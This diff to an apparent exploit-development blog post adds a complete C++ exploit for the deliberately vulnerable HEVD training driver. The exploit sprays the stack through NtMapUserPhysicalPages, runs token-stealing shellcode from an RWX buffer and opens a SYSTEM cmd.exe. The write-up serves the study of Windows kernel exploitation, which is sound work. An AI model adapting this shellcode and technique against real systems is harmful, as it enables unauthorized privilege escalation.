@@ -164,7 +164,141 @@ The most confusing part, will be this `PageFrameNumbers` parameter for our call 
 
 Whew! That's quite a lot to take in, if you have to reread the code 100x, you are not alone. Thanks again to tekwizz123. 
 
-The rest of the code is similar to previous exploits, we lifted the token stealing shellcode straight from b33f's aforementioned blogpost. We call `DeviceIoControl` the same way we have been in Python. The only difference from there is really the use of the `CreateProcessA` API which we used to just gloss over in Python by calling `popen()`. This simply starts a `cmd.exe` shell as `nt authority/system` at the tail end of our exploit when our token has been overwritten. If you want more information about this API, refer back to my Win32 shellcoding [posts](https://h0mbre.github.io/Win32_Reverse_Shellcode/#)!
+The rest of the code is similar to previous exploits, we lifted the token stealing shellcode straight from b33f's aforementioned blogpost. We call `DeviceIoControl` the same way we have been in Python. The only difference from there is really the use of the `CreateProcessA` API which we used to just gloss over in Python by calling `popen()` (which we learned from [rootkits.xyz](https://rootkits.xyz/blog/2017/08/kernel-stack-overflow/)). This simply starts a `cmd.exe` shell as `nt authority/system` at the tail end of our exploit when our token has been overwritten. If you want more information about this API, refer back to my Win32 shellcoding [posts](https://h0mbre.github.io/Win32_Reverse_Shellcode/#)!
+
+Completed code: 
+```cpp
+#include <Windows.h>
+#include <winternl.h>
+#include <stdio.h>
+#include <iostream>
+
+//
+// Defining just our driver name that it uses for IoCreateDevice and also the IOCTL code we use to reach our vulnerable function
+#define DEVICE_NAME     "\\\\.\\HackSysExtremeVulnerableDriver"
+#define IOCTL           0x22202F
+
+//
+// Here we are creating a prototype of the NtMapUserPhysicalPages, we are using the struct member types that tekwizz123 uses, I couldn't get any other definition to work
+typedef NTSTATUS(WINAPI* _NtMapUserPhysicalPages)(
+	PINT BaseAddress,
+	UINT32 NumberOfPages,
+	PBYTE PageFrameNumbers);
+
+//
+// This function simply retrieves a handle to HEVD, this should be standard at this point based on our previous exploits; however, you can see how much easier it is
+// to use Visual C++ and have access to the keywords vs. finding constants for these values and using Python C-types
+//
+HANDLE Get_Handle()
+{
+	HANDLE HEVD = CreateFileA(DEVICE_NAME,
+		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+		FILE_SHARE_READ | FILE_SHARE_WRITE,
+		NULL, OPEN_EXISTING,
+		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
+		NULL);
+
+	if (HEVD == INVALID_HANDLE_VALUE)
+	{
+		std::cout << "[!] Unable to retrieve handle for HEVD, last error: " << GetLastError() << "\n";
+		exit(1);
+	}
+
+	printf("[*] Successfully retrieved handle to HEVD: %X\n", HEVD);
+	return HEVD;
+}
+
+void Spawn_Shell()
+{
+	PROCESS_INFORMATION Process_Info;
+	ZeroMemory(&Process_Info, sizeof(Process_Info));
+	STARTUPINFOA Startup_Info;
+	ZeroMemory(&Startup_Info, sizeof(Startup_Info));
+	Startup_Info.cb = sizeof(Startup_Info);
+	CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &Startup_Info, &Process_Info);
+}
+
+int main()
+{
+	HANDLE HEVD = Get_Handle();
+
+	// Just a dummy buffer so that we don't match the keyword value for BAD0B0B0
+	char Input_Buffer[] = "\x41\x41\x41\x41";
+
+	// Acutally creating an instance of our typedef by typcasting the result of a GetProcAddress call inside of ntdll.dll for 'NtMapUserPhysicalPages' (Thanks tekwizz!)
+	_NtMapUserPhysicalPages NtMapUserPhysicalPages = (_NtMapUserPhysicalPages)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtMapUserPhysicalPages");
+
+	// Token stealing payload straight from b33f's FuzzySec blogpost 
+	char Shellcode[] = (
+		"\x60"
+		"\x64\xA1\x24\x01\x00\x00"
+		"\x8B\x40\x50"
+		"\x89\xC1"
+		"\x8B\x98\xF8\x00\x00\x00"
+		"\xBA\x04\x00\x00\x00"
+		"\x8B\x80\xB8\x00\x00\x00"
+		"\x2D\xB8\x00\x00\x00"
+		"\x39\x90\xB4\x00\x00\x00"
+		"\x75\xED"
+		"\x8B\x90\xF8\x00\x00\x00"
+		"\x89\x91\xF8\x00\x00\x00"
+		"\x61"
+		"\xC3"
+		);
+
+	// Allocate a RWX buffer the size of our shellcode
+	LPVOID Shellcode_Addr = VirtualAlloc(NULL,
+		sizeof(Shellcode),
+		MEM_COMMIT | MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE);
+
+	// Copying our shellcode buffer into our RWX buffer
+	printf("[*] Allocating RWX shellcode at: %X\n", Shellcode_Addr);
+	memcpy(Shellcode_Addr, Shellcode, sizeof(Shellcode));
+
+	// This var is going to be a pointer to the address of Shellcode_Addr, this will end up being the value we spray on the stack
+	LPVOID Spray_Address = &Shellcode_Addr;
+	printf("[*] Our address to spray on the stack: %X\n", Spray_Address);
+
+	// This var will be used as our BaseAddress in our NtMapPhysicalPages API call
+	int Zero = 0;
+
+	// We will typecast this to a PBYTE and reference its address when calling NtMapPhysicalPages
+	char Page_Frame_Numbers[4096] = { 0 };
+
+	// This for loop will take our 4096 character array and fill it with the Spray_Address value
+	for (int i = 0; i < 1024; i++)
+	{
+		memcpy((Page_Frame_Numbers + (i * 4)), Spray_Address, 4);
+	}
+
+	// Calling the API finally, thanks again, tekwizz
+	printf("[*] Spraying stack and triggering vulnerability...\n");
+	NtMapUserPhysicalPages(&Zero,
+		1024,
+		(PBYTE)&Page_Frame_Numbers);
+
+	DWORD Dummy_Bytes = 0;
+
+	// Trigger bug
+	DeviceIoControl(HEVD,
+		0x22202F,
+		&Input_Buffer,
+		sizeof(Input_Buffer),
+		NULL,
+		0,
+		&Dummy_Bytes,
+		NULL); 
+
+	printf("[*] Spawning nt/authority system cmd.exe shell...\n");
+	Spawn_Shell();
+
+	return 0;
+}
+```
+
+## Conclusion
+Figuring out how to deal with that `PageFrameNumbers` parameter of the `NtMapUserPhysicalPages` API was really hard for me as someone who is new to C++. In Python and Powershell it looked really straightforward but was definitely more cumbersome in C++. Couldn't have done this one without the tons of the help I got from the mentioned blog post authors, thanks a ton to them, I'd have been lost without their content. Thanks again for reading!
 
 
 
